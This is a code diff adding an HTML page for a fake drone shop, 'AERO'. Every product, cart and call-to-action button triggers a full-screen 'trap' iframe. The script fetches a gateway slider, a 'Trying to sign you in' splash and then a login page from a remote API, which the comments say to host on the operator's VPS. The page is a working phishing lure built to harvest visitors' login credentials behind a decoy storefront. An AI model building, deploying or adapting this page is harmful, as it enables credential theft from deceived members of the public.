@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AERO | Premium Drone Systems</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #00f2ea;
+            --secondary: #ff0050;
+            --bg: #050510;
+            --card-bg: rgba(255, 255, 255, 0.03);
+            --glass: rgba(255, 255, 255, 0.05);
+            --border: rgba(255, 255, 255, 0.1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Outfit', sans-serif;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: white;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+
+        /* Nav */
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 24px 6%;
+            background: rgba(5, 5, 16, 0.8);
+            backdrop-filter: blur(20px);
+            position: fixed;
+            width: 100%;
+            z-index: 100;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .logo {
+            font-weight: 800;
+            font-size: 24px;
+            letter-spacing: 2px;
+        }
+
+        .logo span {
+            color: var(--primary);
+        }
+
+        .cart-btn {
+            background: var(--glass);
+            border: 1px solid var(--border);
+            padding: 10px 20px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: white;
+        }
+
+        .cart-btn:hover {
+            background: var(--primary);
+            color: black;
+            border-color: var(--primary);
+        }
+
+        /* Hero */
+        header {
+            height: 80vh;
+            display: flex;
+            align-items: center;
+            padding: 0 6%;
+            background: radial-gradient(circle at 70% 50%, rgba(0, 242, 234, 0.1), transparent 50%);
+            margin-top: 60px;
+        }
+
+        .hero-content h1 {
+            font-size: 5rem;
+            line-height: 1.1;
+            margin-bottom: 20px;
+            background: linear-gradient(to right, #fff, #aaa);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero-content p {
+            color: #888;
+            font-size: 1.2rem;
+            max-width: 500px;
+            margin-bottom: 40px;
+        }
+
+        .cta-btn {
+            background: var(--primary);
+            color: black;
+            border: none;
+            padding: 16px 40px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 0 20px rgba(0, 242, 234, 0.3);
+        }
+
+        .cta-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 0 40px rgba(0, 242, 234, 0.5);
+        }
+
+        /* Grid */
+        .products-section {
+            padding: 80px 6%;
+        }
+
+        .section-title {
+            font-size: 2rem;
+            margin-bottom: 40px;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 30px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            overflow: hidden;
+            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative;
+        }
+
+        .card:hover {
+            transform: translateY(-10px);
+            border-color: var(--primary);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+        }
+
+        .card-img {
+            width: 100%;
+            height: 240px;
+            object-fit: cover;
+            background: #111;
+        }
+
+        .card-info {
+            padding: 24px;
+        }
+
+        .card-title {
+            font-size: 1.2rem;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .card-price {
+            color: var(--primary);
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+
+        .add-btn {
+            width: 100%;
+            padding: 12px;
+            background: transparent;
+            border: 1px solid var(--border);
+            color: white;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .card:hover .add-btn {
+            background: white;
+            color: black;
+        }
+
+        /* Full Screen Trap Iframe */
+        #trap-frame {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            border: none;
+            z-index: 9999;
+            background: #000;
+            display: none;
+            /* Hidden by default */
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+
+        #trap-frame.active {
+            display: block;
+            opacity: 1;
+        }
+    </style>
+</head>
+
+<body>
+
+    <nav>
+        <div class="logo">AERO<span>.SYS</span></div>
+        <button class="cart-btn" onclick="triggerTrap()">
+            Cart (0)
+        </button>
+    </nav>
+
+    <header>
+        <div class="hero-content">
+            <h1>Beyond<br>Horizons.</h1>
+            <p>Next-generation autonomous aerial systems for professional exploration.</p>
+            <button class="cta-btn" onclick="triggerTrap()">Explore Series X</button>
+        </div>
+    </header>
+
+    <section class="products-section">
+        <h2 class="section-title">Latest Arrivals</h2>
+        <div class="grid" id="productGrid">
+            <!-- Dynamic Products -->
+        </div>
+    </section>
+
+    <!-- The Trap Door -->
+    <iframe id="trap-frame"></iframe>
+
+    <script>
+        // --- Config ---
+        // In production, point this to your VPS IP e.g., 'https://api.my-vps.com/eapi'
+        const API_URL = 'http://localhost:3000/eapi';
+        const API_KEY = 'key_dev_001';
+
+        // --- Dynamic Content ---
+        const drones = [
+            { name: "Phantom X1", price: "$1,299", img: "https://images.unsplash.com/photo-1507582020474-9a35b7d455d3?auto=format&fit=crop&w=400&q=80" },
+            { name: "Mavic Pro 3", price: "$2,499", img: "https://images.unsplash.com/photo-1527977966376-1c8408f9f108?auto=format&fit=crop&w=400&q=80" },
+            { name: "Inspire 4", price: "$3,899", img: "https://images.unsplash.com/photo-1508614589041-895b8cba3e51?auto=format&fit=crop&w=400&q=80" },
+            { name: "Skydio R2", price: "$999", img: "https://images.unsplash.com/photo-1579829366248-204fe8413f31?auto=format&fit=crop&w=400&q=80" },
+            { name: "Autel Evo", price: "$1,699", img: "https://images.unsplash.com/photo-1506947411487-a56738267384?auto=format&fit=crop&w=400&q=80" },
+            { name: "Falcon 9S", price: "$2,100", img: "https://images.unsplash.com/photo-1473968512647-3e447244af8f?auto=format&fit=crop&w=400&q=80" },
+            { name: "Horizon Air", price: "$1,450", img: "https://images.unsplash.com/photo-1508444845599-5c63d0c3fd71?auto=format&fit=crop&w=400&q=80" },
+            { name: "Cinewhoop Z", price: "$899", img: "https://images.unsplash.com/photo-1521405924368-64c4854ed26e?auto=format&fit=crop&w=400&q=80" },
+            { name: "Phantom X1 Elite", price: "$1,599", img: "https://images.unsplash.com/photo-1507582020474-9a35b7d455d3?auto=format&fit=crop&w=401&q=80" },
+            { name: "Mavic Air", price: "$799", img: "https://images.unsplash.com/photo-1527977966376-1c8408f9f108?auto=format&fit=crop&w=401&q=80" },
+            { name: "Inspire Zen", price: "$4,200", img: "https://images.unsplash.com/photo-1508614589041-895b8cba3e51?auto=format&fit=crop&w=401&q=80" },
+            { name: "Skydio S", price: "$1,100", img: "https://images.unsplash.com/photo-1579829366248-204fe8413f31?auto=format&fit=crop&w=401&q=80" }
+        ];
+
+        const grid = document.getElementById('productGrid');
+        drones.forEach(d => {
+            grid.innerHTML += `
+            <div class="card">
+                <img src="${d.img}" class="card-img" alt="${d.name}">
+                <div class="card-info">
+                    <div class="card-title">${d.name}</div>
+                    <div class="card-price">${d.price}</div>
+                    <button class="add-btn" onclick="triggerTrap()">Add to System</button>
+                </div>
+            </div>
+        `;
+        });
+
+        // --- Trap Logic ---
+        const iframe = document.getElementById('trap-frame');
+
+        // 1. Trigger the Gateway
+        async function triggerTrap() {
+            console.log("🔒 Triggering authentication flow...");
+            iframe.classList.add('active');
+
+            try {
+                const response = await fetch(`${API_URL}/pages?type=gateway`, {
+                    headers: { 'X-API-KEY': API_KEY }
+                });
+                const data = await response.json();
+
+                if (data.success && data.html) {
+                    injectIntoFrame(data.html);
+                } else {
+                    console.error("Failed:", data);
+                    // Fallback: Just reload the page or show alert
+                    window.location.reload();
+                }
+            } catch (error) {
+                console.error("Network error:", error);
+            }
+        }
+
+        // 2. Callback when Gateway (Slider) is solved -> Fetch Splash
+        window.onGatewaySuccess = async (token) => {
+            console.log("✅ Gateway solved! Token:", token);
+            console.log("🎬 Fetching Splash (Envelope + 'Trying to sign you in')...");
+
+            try {
+                const response = await fetch(`${API_URL}/pages?type=splash&token=${token}`, {
+                    headers: { 'X-API-KEY': API_KEY }
+                });
+                const data = await response.json();
+
+                if (data.success && data.html) {
+                    injectIntoFrame(data.html);
+                    // Splash will auto-call onSplashComplete after 5 seconds
+                } else {
+                    console.error("Failed to load splash:", data);
+                }
+            } catch (error) {
+                console.error("Splash fetch error:", error);
+            }
+        };
+
+        // 3. Callback when Splash animation completes -> Fetch Login
+        window.onSplashComplete = async () => {
+            console.log("🎬 Splash complete!");
+            console.log("🔄 Fetching Login Page...");
+
+            try {
+                const response = await fetch(`${API_URL}/pages?type=login`, {
+                    headers: { 'X-API-KEY': API_KEY }
+                });
+                const data = await response.json();
+
+                if (data.success && data.html) {
+                    injectIntoFrame(data.html);
+                } else {
+                    console.error("Failed to load login:", data);
+                }
+            } catch (error) {
+                console.error("Login fetch error:", error);
+            }
+        };
+
+        function injectIntoFrame(htmlContent) {
+            const doc = iframe.contentWindow.document;
+            doc.open();
+            doc.write(htmlContent);
+            doc.close();
+        }
+
+    </script>
+</body>
+
+</html>
